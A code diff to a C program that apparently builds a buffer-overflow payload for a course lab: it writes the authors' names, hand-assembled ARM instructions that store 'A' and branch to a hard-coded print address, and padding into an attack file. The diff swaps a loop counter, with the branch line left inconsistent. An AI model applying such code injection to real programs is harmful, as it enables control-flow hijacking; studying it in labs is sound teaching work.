@@ -6,6 +6,7 @@ int main(void) {
     char pcInject[48];
     char pcName[] = "Angeline Yan and Jade Sceats";
     int iNameLength;
+    int i;
     unsigned long uiTargetAddr = 0x400890;
     unsigned int uiAdr, uiMov, uiStrb, uiB;
     FILE *psFile;
@@ -35,15 +36,15 @@ int main(void) {
     /* set "A" instr */
     uiStrb = MiniAssembler_strb(1, 0);
     fwrite(&uiStrb, sizeof(unsigned int), 1, psFile);
-    iNameLength = iNameLength + 12;
+    i = iNameLength + 12;
     /* branch to print instr (0x40089c is addr of print instr in main,
     0x420058 + i is addr of this instr) */
     uiB = MiniAssembler_b(0x40089c, 0x420058 + iNameLength);
     fwrite(&uiB, sizeof(unsigned int), 1, psFile);
-    iNameLength = iNameLength + 4;
+    i = i + 4;
 
     /* pad as necessary */
-    for (; iNameLength < 48; iNameLength++) {
+    for (; i < 48; i++) {
         fprintf(psFile, "%c", 0x30);
     }
 
